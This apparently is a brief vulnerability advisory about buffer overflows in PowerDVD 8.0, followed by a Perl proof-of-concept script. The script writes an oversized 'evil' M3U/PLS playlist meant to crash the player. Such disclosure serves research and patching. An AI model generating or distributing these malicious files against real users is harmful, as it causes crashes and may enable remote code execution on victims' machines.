PowerDVD is prone to multiple buffer-overflow vulnerabilities because it fails to perform adequate boundary checks on user-supplied input.

Successfully exploiting these issues may allow remote attackers to execute arbitrary code in the context of the application. Failed exploit attempts will cause denial-of-service conditions.

PowerDVD 8.0 is vulnerable; prior versions may also be affected.

$buffer = "J" x 520000;

open(m3u, ">./evil_list.m3u"); # or .pls

print m3u "$buffer";

print "\n--> Evil Playlist created... Have fun!\n";
